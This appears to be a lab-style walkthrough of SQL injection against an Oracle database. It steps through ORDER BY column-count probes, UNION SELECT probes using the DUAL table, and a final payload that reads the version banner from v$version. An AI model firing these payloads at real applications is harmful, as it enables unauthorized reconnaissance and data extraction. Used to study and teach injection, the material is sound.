# Querying the database type and version on Oracle

**STEP #1**

Determine the number of columns returned from the original query.

```text
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

```text
' ORDER BY 3--  -> Returns an error message "Internal Server Error"
```

**Therefore the number of columns returned by the original query is 2**

**STEP #2**

Discover the column which contains data type string.

{% hint style="info" %}
💡 **NOTE
In Oracle databases, every SELECT statement must include a FROM attribute. So, injecting an **`' UNION SELECT NULL`**produces an error regardless of the number of columns. You can satisfy this requirement by providing a globally accessible table **`DUAL`**.**
{% endhint %}


```text
' UNION SELECT 'a', NULL FROM DUAL-- → Returns status code 200
' UNION SELECT 'a', 'a' FROM DUAL--  → Returns status code 200
```

**Therefore column 1 and 2 both contain data type string.**

We can use either column 1 or 2 to retrieve the database type and version.

**STEP #3**

Querying the Oracle database to retrieve database type and version.

```text
' UNION SELECT banner, NULL FROM v$version--
```
